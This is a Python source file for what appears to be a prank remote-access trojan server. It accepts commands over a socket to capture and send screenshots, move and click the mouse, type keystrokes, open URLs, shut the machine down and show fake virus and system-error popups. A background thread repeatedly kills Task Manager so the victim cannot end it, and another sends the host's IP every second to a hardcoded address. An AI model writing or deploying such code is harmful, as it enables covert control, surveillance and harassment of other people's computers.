import socket
import threading
import zlib
import numpy as np
import cv2
import pyautogui
import keyboard as kb
from pynput.keyboard import Controller, Key
import time
import sys
import os
import psutil

class RemoteControlServer:
    def __init__(self, host='0.0.0.0', port=65432):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.running = False
        self.reverse_mouse = False
        self.keyboard_controller = Controller()
        self.keyboard_capture_active = False
        self.block_taskmgr = False

    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(1)
        self.running = True

        # Запуск фонового мониторинга Диспетчера задач
        taskmgr_thread = threading.Thread(
            target=self.monitor_task_manager,
            daemon=True
        )
        taskmgr_thread.start()

        print(f"Server started on {self.host}:{self.port}. Waiting for connections...")

        try:
            while self.running:
                self.client_socket, addr = self.server_socket.accept()
                print(f"Connected by {addr}")

                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(self.client_socket,),
                    daemon=True
                )
                client_thread.start()

        except KeyboardInterrupt:
            print("\nShutting down server...")
        finally:
            self.stop()

    def stop(self):
        self.running = False
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        print("Server stopped")

    def handle_client(self, client_socket):
        try:
            while self.running:
                command = client_socket.recv(4096).decode().strip()
                if not command:
                    break

                response = self.process_command(command)
                if response:
                    client_socket.sendall(response.encode())

        except ConnectionResetError:
            print("Client disconnected unexpectedly")
        except Exception as e:
            print(f"Error handling client: {e}")
        finally:
            client_socket.close()
            print("Client connection closed")

    def process_command(self, command):
        try:
            parts = command.split()
            cmd = parts[0].lower()

            if cmd == "screenshot":
                return self.send_screenshot()

            elif cmd == "move":
                if len(parts) == 3:
                    x, y = map(int, parts[1:3])
                    if self.reverse_mouse:
                        x, y = -x, -y
                    pyautogui.moveRel(x, y)
                    return "OK"

            elif cmd == "click":
                if len(parts) == 2:
                    button = parts[1].lower()
                    pyautogui.click(button=button)
                    return "OK"

            elif cmd == "automove":
                speed = 0.5 if len(parts) < 2 else float(parts[1])
                pyautogui.moveRel(100, 0, duration=speed)
                pyautogui.moveRel(0, 100, duration=speed)
                pyautogui.moveRel(-100, 0, duration=speed)
                pyautogui.moveRel(0, -100, duration=speed)
                return "OK"

            elif cmd == "autoclick":
                interval = 1.0 if len(parts) < 2 else float(parts[1])
                for _ in range(5):
                    pyautogui.click()
                    time.sleep(interval)
                return "OK"

            elif cmd == "rick":
                self.play_rick_roll()
                return "OK"

            elif cmd == "fake_virus":
                self.show_fake_virus()
                return "OK"

            elif cmd == "shutdown":
                os.system("shutdown /s /t 1")
                return "OK"

            elif cmd == "fake_error":
                self.show_fake_error()
                return "OK"

            elif cmd == "reverse_mouse":
                self.reverse_mouse = not self.reverse_mouse
                status = "ON" if self.reverse_mouse else "OFF"
                return f"Reverse mouse mode: {status}"

            elif cmd == "type":
                text = ' '.join(parts[1:])
                self.keyboard_controller.type(text)
                return "OK"

            elif cmd == "open":
                if len(parts) > 1:
                    url = ' '.join(parts[1:])
                    import webbrowser
                    webbrowser.open(url)
                    return "OK"

            elif cmd == "key":
                if len(parts) > 1:
                    key = parts[1]
                    self.press_key(key)
                    return "OK"

            elif cmd == "special_key":
                if len(parts) > 1:
                    key_name = parts[1]
                    self.press_special_key(key_name)
                    return "OK"

            elif cmd == "keyboard_capture":
                self.keyboard_capture_active = True
                return "Keyboard capture started"

            elif cmd == "block_taskmgr":
                self.block_taskmgr = not self.block_taskmgr
                status = "ON" if self.block_taskmgr else "OFF"
                return f"Task Manager blocking: {status}"

            elif cmd == "exit":
                self.running = False
                return "Goodbye"

            return "Unknown command"

        except Exception as e:
            return f"Error executing command: {e}"

    def kill_task_manager(self):
        for process in psutil.process_iter(['pid', 'name']):
            if process.info['name'] == 'Taskmgr.exe':
                try:
                    os.system(f"taskkill /f /pid {process.info['pid']}")
                    print("Task Manager killed!")
                except Exception as e:
                    print(f"Error killing Task Manager: {e}")

    def monitor_task_manager(self):
        while self.running:
            if self.block_taskmgr:
                self.kill_task_manager()
            time.sleep(0.5)

    def press_key(self, key):
        try:
            self.keyboard_controller.press(key)
            time.sleep(0.05)
            self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing key {key}: {e}")

    def press_special_key(self, key_name):
        try:
            special_keys = {
                'ctrl': Key.ctrl, 'shift': Key.shift, 'alt': Key.alt,
                'enter': Key.enter, 'esc': Key.esc, 'space': Key.space,
                'tab': Key.tab, 'backspace': Key.backspace, 'delete': Key.delete,
                'up': Key.up, 'down': Key.down, 'left': Key.left, 'right': Key.right
            }
            key = special_keys.get(key_name.lower())
            if key:
                self.keyboard_controller.press(key)
                time.sleep(0.05)
                self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing special key {key_name}: {e}")

    def send_screenshot(self):
        try:
            img = pyautogui.screenshot()
            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            _, img_encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 70])
            compressed = zlib.compress(img_encoded.tobytes())
            size = len(compressed)
            size_bytes = size.to_bytes(4, 'big')
            return size_bytes + compressed
        except Exception as e:
            print(f"Error sending screenshot: {e}")
            return "Error"

    def play_rick_roll(self):
        try:
            os.system('start https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        except:
            pass

    def show_fake_virus(self):
        try:
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            messagebox.showerror(
                "Virus Alert",
                "CRITICAL ERROR!\nYour computer has been infected!"
            )
        except:
            pass

    def show_fake_error(self):
        try:
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            messagebox.showerror(
                "System Error",
                "Windows has encountered a critical error!\nError code: 0x80070002"
            )
        except:
            pass

def multicast_send():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))  # Google's public DNS
    local_ip = s.getsockname()[0]
    s.close()

    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.sendto(local_ip.encode('utf-8'), ("172.16.79.23", 45631))
        sock.close()
        time.sleep(1)

if __name__ == "__main__":
    try:
        import pyautogui
        import keyboard
        from pynput.keyboard import Controller
        import psutil
    except ImportError as e:
        print(f"Error: Required library not found - {e}")
        print("Please install with: pip install pyautogui keyboard pynput psutil")
        sys.exit(1)

    threading.Thread(target=multicast_send).start()

    server = RemoteControlServer()
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()
